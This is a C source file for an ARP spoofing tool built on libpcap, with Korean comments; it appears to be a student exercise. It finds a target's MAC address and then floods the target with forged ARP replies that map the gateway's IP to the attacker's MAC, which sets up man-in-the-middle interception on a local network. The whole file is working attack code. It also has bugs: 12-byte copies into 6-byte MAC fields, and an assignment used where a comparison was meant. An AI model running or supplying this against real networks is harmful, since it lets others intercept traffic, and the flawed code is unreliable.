#include <sys/time.h>
#include <netinet/in.h>
#include <pcap/pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <netinet/if_ether.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/rtnetlink.h>
#include <arpa/inet.h>
#define DEBUG_LEVEL_	3

#ifdef  DEBUG_LEVEL_
#define dp(n, fmt, args...)	if (DEBUG_LEVEL_ <= n) fprintf(stderr, "%s:%d,"fmt, __FILE__, __LINE__, ## args)
#define dp0(n, fmt)		if (DEBUG_LEVEL_ <= n) fprintf(stderr, "%s:%d,"fmt, __FILE__, __LINE__)
#define _dp(n, fmt, args...)	if (DEBUG_LEVEL_ <= n) fprintf(stderr, " "fmt, ## args)
#else	/* DEBUG_LEVEL_ */
#define dp(n, fmt, args...)
#define dp0(n, fmt)
#define _dp(n, fmt, args...)
#endif	/* DEBUG_LEVEL_ */

struct route_info
{
    struct in_addr dstAddr;
    struct in_addr srcAddr;
    struct in_addr gateWay;
    char ifName[IF_NAMESIZE];
};

int callback(const u_char *packet, u_char *t_mac, char* t_ip);
int getIPAddress(char *ip_addr,char *dev); //host ip,mac gateway ip 정보 구하는 함수는 구글링을 통해 얻었습니다.
int getMacAddress(u_char *mac, char *dev);
int getGatewayIP(char *gatewayip, socklen_t size);
int readNlSock(int sockFd, char *bufPtr, int seqNum, int pId);
void parseRoutes(struct nlmsghdr *nlHdr, struct route_info *rtInfo);

int main(int argc, char **argv){
    char *dev;
    char errbuf[PCAP_ERRBUF_SIZE];
    int ret;
    struct pcap_pkthdr hdr;
    struct in_addr net_addr, mask_addr;
    struct ether_header *eptr;
    const u_char *packet;
    u_char *cp;
    u_char sp_buf[1024];
    u_char t_ip[16], s_ip[16], g_ip[16], t_mac[6] = {0xff,0xff,0xff,0xff,0xff,0xff}, s_mac[6];

    struct bpf_program fp;

    pcap_t *pcd;  // packet capture descriptor

    dev = pcap_lookupdev(errbuf); // 디바이스 이름
    if (dev == NULL)    {
        printf("%s\n", errbuf);
        exit(1);
    }

    pcd = pcap_open_live(dev, BUFSIZ,  1, 1000, errbuf);
    if (pcd == NULL){
        printf("%s\n", errbuf);
        exit(1);
    }
    printf("Target IP Adress: ");
    scanf("%s", t_ip);
    getIPAddress(s_ip, dev);
    getMacAddress(s_mac, dev);
    getGatewayIP(g_ip, 16);
    printf("Source IP Adress: %s\n", s_ip);
    printf("Gateway IP Adress: %s\n", g_ip);

    struct ether_header etheh;

    cp = sp_buf;
    memcpy(etheh.ether_dhost, t_mac, 12);
    memcpy(etheh.ether_shost, s_mac, 12);
    etheh.ether_type = htons(ETHERTYPE_ARP);
    memcpy(cp, &etheh, sizeof(struct ether_header));
    cp += sizeof(struct ether_header);

    struct ether_arp arph;
    memcpy(arph.arp_sha, s_mac, 12);
    inet_aton(s_ip, &(arph.arp_spa));
    memcpy(arph.arp_tha, t_mac, 12);
    inet_aton(t_ip, &(arph.arp_tpa));
    arph.ea_hdr.ar_hln = 6;
    arph.ea_hdr.ar_hrd = htons(1);
    arph.ea_hdr.ar_pln = 4;
    arph.ea_hdr.ar_pro = htons(0x0800);
    arph.ea_hdr.ar_op = htons(1);
    memcpy(cp, &arph, sizeof(struct ether_arp)); //arp 패킷 세팅

    if((pcap_inject(pcd,sp_buf,sizeof(struct ether_header)+sizeof(struct ether_arp))) ==-1) {
        pcap_perror(pcd,0);
        pcap_close(pcd);
        exit(1);
    };


    // 패킷이 캡쳐되면 callback함수를 실행한다.
    while(1){

        packet = pcap_next(pcd, &hdr);
        if(callback(packet, t_mac, t_ip) == 1)
            break;
    }
    printf("Source MAC Address: ");
    for(int i=0; i<5; i++)
        printf("%2x:", s_mac[i]);
    printf("%2x\n", s_mac[5]);
    printf("Target MAC Address: ");
    for(int i=0; i<5; i++)
        printf("%2x:", t_mac[i]);
    printf("%2x\n", t_mac[5]);

    printf("Attack start\n"); //타겟에 게이트웨이 ip와 자신의 mac을 담은 arp reply패킷을 전송한다
    inet_aton(g_ip, &(arph.arp_spa));
    arph.ea_hdr.ar_op = htons(2);

    cp = sp_buf;
    cp += sizeof(struct ether_header);
    memcpy(cp, &arph, sizeof(struct ether_arp)); //arp 패킷 세팅

    while(1){
        printf("send arp reply packet\n");
        if((pcap_inject(pcd,sp_buf,sizeof(struct ether_header)+sizeof(struct ether_arp))) ==-1) {
            pcap_perror(pcd,0);
            pcap_close(pcd);
            exit(1);
        };
        sleep(1);
    }
    return 0;
}
int callback(const u_char *packet, u_char * t_mac, char* t_ip){
    struct ether_header *etheh; // Ethernet 헤더 구조체
    unsigned short ether_type;

    // 이더넷 헤더를 가져온다.
    etheh = (struct ether_header *)packet;
    packet += sizeof(struct ether_header);
    // 네트워크 패킷은 big redian 이라서 little redian형식으로 바꿔준다.
    ether_type = ntohs(etheh->ether_type);

    if (ether_type == ETHERTYPE_ARP){
        struct ether_arp *arph; // arp 헤더 구조체
        arph = (struct ether_arp *)packet;
        packet += sizeof(struct ether_arp);
        if(arph->ea_hdr.ar_op = 2){
            char tip[16];
            inet_ntop(AF_INET, &arph->arp_spa, tip, sizeof(tip));
            if(!strcmp(tip, t_ip)){
                memcpy(t_mac, arph->arp_sha, 12);
                return 1;
            }
        }
    }
    return 0;
}
int getIPAddress(char *ip_addr, char *dev){
    int sock;
    struct ifreq ifr;
    struct sockaddr_in *sin;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0){
        dp(4, "socket");
        return 0;
    }


    strcpy(ifr.ifr_name, dev);
    if (ioctl(sock, SIOCGIFADDR, &ifr)< 0){
        dp(4, "ioctl() - get ip");
        close(sock);
        return 0;
    }

    sin = (struct sockaddr_in*)&ifr.ifr_addr;
    strcpy(ip_addr, inet_ntoa(sin->sin_addr));

    close(sock);
    return 1;
}
int getMacAddress(u_char *mac, char *dev){
    int sock;
    struct ifreq ifr;
    char mac_adr[18] = {0,};

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0){
        dp(4, "socket");
        return 0;
    }

    strcpy(ifr.ifr_name, dev);
    if (ioctl(sock, SIOCGIFHWADDR, &ifr)< 0){
        dp(4, "ioctl() - get mac");
        close(sock);
        return 0;
    }

    //convert format ex) 00:00:00:00:00:00
    for(int i=0; i<6; i++)
        mac[i] = ifr.ifr_hwaddr.sa_data[i];

    close(sock);
    return 1;
}
int readNlSock(int sockFd, char *bufPtr, int seqNum, int pId){
    struct nlmsghdr *nlHdr;
    int readLen = 0, msgLen = 0;

    do{
        /* Recieve response from the kernel */
        if((readLen = recv(sockFd, bufPtr, 8192 - msgLen, 0)) < 0)        {
            perror("SOCK READ: ");
            return -1;
        }

        nlHdr = (struct nlmsghdr *)bufPtr;

        /* Check if the header is valid */
        if((NLMSG_OK(nlHdr, readLen) == 0) || (nlHdr->nlmsg_type == NLMSG_ERROR)){
            perror("Error in recieved packet");
            return -1;
        }

        /* Check if the its the last message */
        if(nlHdr->nlmsg_type == NLMSG_DONE){
            break;
        }
        else{
            /* Else move the pointer to buffer appropriately */
            bufPtr += readLen;
            msgLen += readLen;
        }


        /* Check if its a multi part message */
        if((nlHdr->nlmsg_flags & NLM_F_MULTI) == 0){
            /* return if its not */
            break;
        }
    } while((nlHdr->nlmsg_seq != seqNum) || (nlHdr->nlmsg_pid != pId));

    return msgLen;
}

/* parse the route info returned */
void parseRoutes(struct nlmsghdr *nlHdr, struct route_info *rtInfo){
    struct rtmsg *rtMsg;
    struct rtattr *rtAttr;
    int rtLen;

    rtMsg = (struct rtmsg *)NLMSG_DATA(nlHdr);

    /* If the route is not for AF_INET or does not belong to main routing table	then return. */
    if((rtMsg->rtm_family != AF_INET) || (rtMsg->rtm_table != RT_TABLE_MAIN))
        return;

    /* get the rtattr field */
    rtAttr = (struct rtattr *)RTM_RTA(rtMsg);
    rtLen = RTM_PAYLOAD(nlHdr);

    for(;RTA_OK(rtAttr,rtLen);rtAttr = RTA_NEXT(rtAttr,rtLen)){
        switch(rtAttr->rta_type){
            case RTA_OIF:
            if_indextoname(*(int *)RTA_DATA(rtAttr), rtInfo->ifName);
            break;

            case RTA_GATEWAY:
            memcpy(&rtInfo->gateWay, RTA_DATA(rtAttr), sizeof(rtInfo->gateWay));
            break;

            case RTA_PREFSRC:
            memcpy(&rtInfo->srcAddr, RTA_DATA(rtAttr), sizeof(rtInfo->srcAddr));
            break;

            case RTA_DST:
            memcpy(&rtInfo->dstAddr, RTA_DATA(rtAttr), sizeof(rtInfo->dstAddr));
            break;
        }
    }

    return;
}
int getGatewayIP(char *gatewayip, socklen_t size){
    int found_gatewayip = 0;

    struct nlmsghdr *nlMsg;
    struct rtmsg *rtMsg;
    struct route_info *rtInfo;
    char msgBuf[8192]; // pretty large buffer

    int sock, len, msgSeq = 0;

    /* Create Socket */
    if((sock = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_ROUTE)) < 0){
        perror("Socket Creation: ");
        return(-1);
    }

    /* Initialize the buffer */
    memset(msgBuf, 0, 8192);

    /* point the header and the msg structure pointers into the buffer */
    nlMsg = (struct nlmsghdr *)msgBuf;
    rtMsg = (struct rtmsg *)NLMSG_DATA(nlMsg);

    /* Fill in the nlmsg header*/
    nlMsg->nlmsg_len = NLMSG_LENGTH(sizeof(struct rtmsg)); // Length of message.
    nlMsg->nlmsg_type = RTM_GETROUTE; // Get the routes from kernel routing table .

    nlMsg->nlmsg_flags = NLM_F_DUMP | NLM_F_REQUEST; // The message is a request for dump.
    nlMsg->nlmsg_seq = msgSeq++; // Sequence of the message packet.
    nlMsg->nlmsg_pid = getpid(); // PID of process sending the request.

    /* Send the request */
    if(send(sock, nlMsg, nlMsg->nlmsg_len, 0) < 0){
        fprintf(stderr, "Write To Socket Failed...\n");
        return -1;
    }

    /* Read the response */
    if((len = readNlSock(sock, msgBuf, msgSeq, getpid())) < 0){
        fprintf(stderr, "Read From Socket Failed...\n");
        return -1;
    }

    /* Parse and print the response */
    rtInfo = (struct route_info *)malloc(sizeof(struct route_info));

    for(;NLMSG_OK(nlMsg,len);nlMsg = NLMSG_NEXT(nlMsg,len)){
        memset(rtInfo, 0, sizeof(struct route_info));
        parseRoutes(nlMsg, rtInfo);

        // Check if default gateway
        if (strstr((char *)inet_ntoa(rtInfo->dstAddr), "0.0.0.0")){
            // copy it over
            inet_ntop(AF_INET, &rtInfo->gateWay, gatewayip, size);
            found_gatewayip = 1;
            break;
        }
    }

    free(rtInfo);
    close(sock);

    return found_gatewayip;
}
